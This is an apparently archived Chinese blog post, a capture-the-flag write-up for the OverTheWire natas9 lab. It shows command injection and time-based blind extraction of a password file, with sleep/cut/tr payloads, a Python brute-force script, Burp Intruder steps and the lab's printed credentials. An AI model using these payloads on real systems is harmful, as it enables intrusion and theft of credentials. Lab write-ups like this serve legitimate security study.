@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,命令注入," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="从一道题目开始给一个题目，http://natas9.natas.labs.overthewire.org/ ，账号natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl。题目要求是读取/etc/natas_webpass/natas10的内容。">
+<meta name="keywords" content="CTF,命令注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令注入中的时间盲注">
+<meta property="og:url" content="http://yoursite.com/2018/09/12/time-base-order-injection/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="从一道题目开始给一个题目，http://natas9.natas.labs.overthewire.org/ ，账号natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl。题目要求是读取/etc/natas_webpass/natas10的内容。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536681008893.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536681035011.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536682337053.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536682464618.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536682482595.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536682627563.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536682890311.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536683467552.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536683734745.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536684123901.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536684291268.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536684750640.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536684787440.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536718649165.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536720968752.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536720974745.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536721260918.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536721368673.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536721348715.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536722686702.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536722385917.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536722600373.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536722919805.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536723047264.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536723451626.png">
+<meta property="og:updated_time" content="2018-09-12T04:12:11.901Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="命令注入中的时间盲注">
+<meta name="twitter:description" content="从一道题目开始给一个题目，http://natas9.natas.labs.overthewire.org/ ，账号natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl。题目要求是读取/etc/natas_webpass/natas10的内容。">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1536681008893.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/12/time-base-order-injection/"/>
+
+
+
+
+
+  <title>命令注入中的时间盲注 | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大学生的酸腐和矫情是这世界上最没用的东西.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/12/time-base-order-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">命令注入中的时间盲注</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-09-12T11:48:32+08:00">
+                2018-09-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="从一道题目开始"><a href="#从一道题目开始" class="headerlink" title="从一道题目开始"></a>从一道题目开始</h1><p>给一个题目，<a href="http://natas9.natas.labs.overthewire.org/" target="_blank" rel="noopener">http://natas9.natas.labs.overthewire.org/</a> ，账号natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl。题目要求是读取<code>/etc/natas_webpass/natas10</code>的内容。<a id="more"></a>题目页面：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536681008893.png" alt="enter description here">可以看源码<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536681035011.png" alt="enter description here">这里存在一个命令注入点，我们可以用<code>|,%0a,;</code>和#号配合使用，造成命令注入：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536682337053.png" alt="enter description here">在url处直接用#是无效的，必须用%23，还要注意在使用注释符#之前要先加一个空格。<br>题目当然是很简单的，我们可以自己加点难度，比如说，页面没有回显，怎么办？</p>
+<h2 id="0x00-写shell"><a href="#0x00-写shell" class="headerlink" title="0x00 写shell"></a>0x00 写shell</h2><p>写shell当然是先要有写权限，先尝试创建一个文件。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536682464618.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1536682482595.png" alt="enter description here">发现是不行的，没有写权限，那么，另辟蹊径吧。</p>
+<h2 id="0x01-反弹shell"><a href="#0x01-反弹shell" class="headerlink" title="0x01 反弹shell"></a>0x01 反弹shell</h2><p>首先看看目标服务器有没有nc，用<code>which nc</code>命令，which命令可以查看某个系统命令是否存在，以及执行的到底是哪一个位置的命令。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536682627563.png" alt="enter description here">发现nc是有的，尝试一波反弹shell<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536682890311.png" alt="enter description here">失败了，猜测题目禁止了出口流量，这里用到了一个方法来检测是不是真的禁止了出口流量：首先在自己的VPS上tcpdump，监听整个网卡的ICMP流量(ping使用的是ICMP协议)本地测试是能监听到的<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536683467552.png" alt="enter description here">但是目标服务器测试失败了，说明目标服务器确实禁止了出口流量。</p>
+<h2 id="0x02-用curl，wget带上数据访问自己的VPS"><a href="#0x02-用curl，wget带上数据访问自己的VPS" class="headerlink" title="0x02 用curl，wget带上数据访问自己的VPS"></a>0x02 用curl，wget带上数据访问自己的VPS</h2><p>禁止了出口流量，这个方法肯定是不行的了。我还是做了一个本地测试<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536683734745.png" alt="enter description here"></p>
+<h2 id="都不行？"><a href="#都不行？" class="headerlink" title="都不行？"></a>都不行？</h2><p>这时候我们发现，上述三个比较常见的方法都是不行的，我们需要另辟蹊径，这里用到了时间盲注~</p>
+<h1 id="时间盲注的本地测试"><a href="#时间盲注的本地测试" class="headerlink" title="时间盲注的本地测试"></a>时间盲注的本地测试</h1><p>首先我们来看一下tr命令，它可以用来将一个字符替换为另一个字符，类似于单表替换加密<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536684123901.png" alt="enter description here">我们又知道，sleep命令可以让当前动作sleep一段时间，那么，我们可以通过对flag字段逐个字去试，比如flag的第一个字母是f，我们可以这样去把它试出来：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536684291268.png" alt="enter description here">与SQL注入的时间盲注原理是一样的，遍历tr的第一个参数以及<code>cut -c</code>的数值即可</p>
+<h1 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h1><p>现在，在我们知道flag的第一个字母是n的情况下，直接测试一下<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536684750640.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1536684787440.png" alt="enter description here">可以看到，返回时间相差4s左右，可以判断这个payload是生效的。</p>
+<h2 id="python解题"><a href="#python解题" class="headerlink" title="python解题"></a>python解题</h2><p>脚本这东西，当然要多写写啦~<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://natas9.natas.labs.overthewire.org/'</span></span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080'</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'Authorization'</span>: <span class="string">'Basic bmF0YXM5OlcwbU1oVWNSUm5HOGRjZ2hFNHF2azNKQTlsR3Q4bkRs'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	pos=<span class="number">1</span></span><br><span class="line">	flag=<span class="string">''</span></span><br><span class="line">	ses=requests.session()</span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">			t1=time.time()</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				r=ses.get(url=url,params=&#123;<span class="string">'needle'</span>:<span class="string">';sleep $(cat /etc/natas_webpass/natas10|cut -c%s|tr %s 4) #'</span>%(str(pos),chr(i))&#125;,</span><br><span class="line">					timeout=<span class="number">7</span>,proxies=proxies,headers=headers)</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">print</span> e</span><br><span class="line">			t2=time.time()</span><br><span class="line">			<span class="keyword">if</span> t2-t1&gt;=<span class="number">3.5</span>:</span><br><span class="line">				pos+=<span class="number">1</span></span><br><span class="line">				flag+=chr(i)</span><br><span class="line">				<span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
+<p>不过这网站有点卡，脚本不稳定，我抓了脚本的包手动测了下，是没错的。</p>
+<h2 id="burp解题"><a href="#burp解题" class="headerlink" title="burp解题"></a>burp解题</h2><p>既然网站卡，盲注不稳定，那就可以用burp尝试一波。首先用<code>;sleep $(cat /etc/natas_webpass/natas10|wc -c) #</code>来判断flag的长度<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536718649165.png" alt="enter description here">可以看到，长度应该是33，我们知道真实的flag长度是32，相差一个，还可以接受？然后，我们对flag中的每个字符都sleep一下，如果不是数字，不会有时延，如果有时延，说明是数字，而且延迟了几秒就是数字几。抓个包，放到intruder爆破<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536720968752.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1536720974745.png" alt="enter description here">选定<code>Intruder attack</code>的<code>Columns</code>中的<code>Response completed</code>可以查看返回时长<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536721260918.png" alt="enter description here">选定几个时长最长的，再重复发送几次<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536721368673.png" alt="enter description here">稳定下来基本是这样的<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536721348715.png" alt="enter description here">所以可以推断，flag的第5,15,22位的数字是1，第27位数字是7，这跟flag是符合的。接下来我们就可以正式逐个爆破，这时候字典里就不需要数字了。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536722686702.png" alt="enter description here">参数1的字典不需要5,15,22,27四个数字，<code>seq 1 32 &gt; 1.lst</code>后，手动剔除。参数1：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536722385917.png" alt="enter description here">参数2：直接用burp内置字典ADD a-z,A-Z,再手动加上一些符号和0。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536722600373.png" alt="enter description here">线程数设成20，然后，开始愉快地爆破。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536722919805.png" alt="enter description here">结果出现了很明显的分层，为了防止意外，把2s以上的再重发几遍，最后稳定下来是这样的<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536723047264.png" alt="enter description here">一个个拼起来，加上之前的数字，得到的结果是<code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code>与我们之前读到的flag是完全一样的~</p>
+<h1 id="something-else"><a href="#something-else" class="headerlink" title="something else"></a>something else</h1><p>有时候读的文件可能会有一些不可见字符，可以先把它base64一下,base64 命令输出默认按每行 76 个字符进行折行，用参数 -w0 取消这个行为<img src="https://www.github.com/coomrade/Img/raw/master/pics/1536723451626.png" alt="enter description here"><br><strong>let’s go, fuck everything~</strong></p>
+<h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p><a href="http://www.freebuf.com/vuls/183636.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/183636.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/命令注入/" rel="tag"># 命令注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/11/phar-unser/" rel="next" title="通过phar拓宽反序列化漏洞攻击面">
+                <i class="fa fa-chevron-left"></i> 通过phar拓宽反序列化漏洞攻击面
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/12/MYSQL写shell与提权/" rel="prev" title="MYSQL写shell与提权">
+                MYSQL写shell与提权 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#从一道题目开始"><span class="nav-number">1.</span> <span class="nav-text">从一道题目开始</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-写shell"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 写shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-反弹shell"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-用curl，wget带上数据访问自己的VPS"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 用curl，wget带上数据访问自己的VPS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#都不行？"><span class="nav-number">1.4.</span> <span class="nav-text">都不行？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#时间盲注的本地测试"><span class="nav-number">2.</span> <span class="nav-text">时间盲注的本地测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#回到题目"><span class="nav-number">3.</span> <span class="nav-text">回到题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#python解题"><span class="nav-number">3.1.</span> <span class="nav-text">python解题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#burp解题"><span class="nav-number">3.2.</span> <span class="nav-text">burp解题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#something-else"><span class="nav-number">4.</span> <span class="nav-text">something else</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referer"><span class="nav-number">5.</span> <span class="nav-text">Referer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
